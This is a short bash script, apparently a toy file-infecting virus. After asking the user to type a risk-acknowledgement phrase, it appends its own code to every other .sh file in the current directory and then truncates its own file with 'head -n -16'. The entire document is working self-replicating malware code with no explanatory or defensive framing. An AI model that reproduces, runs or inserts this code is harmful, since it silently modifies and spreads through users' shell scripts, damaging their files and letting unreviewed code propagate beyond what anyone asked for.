#!/bin/bash

echo "-I_understand_all_risks_and_i_want_to_run_the_program/-no"
read  choice
case "$choice" in 
"-I_understand_all_risks_and_i_want_to_run_the_program")
;;
"-no") echo "Ok, good choice)"
exit 0
;;
* ) echo "invalid"
exit 0
;;
esac

files=($(ls *.sh | tr " " "\n"))
filename=$(basename $0)

for file in "${files[@]}"; do
    if [[ $file != $filename ]]; then
        echo -n -e "\n" >> "$file"
        cat $0 >> "$file"
    fi
done

head -n -16 $0 > temp.sh && chmod +x temp.sh && mv temp.sh $0

exit 0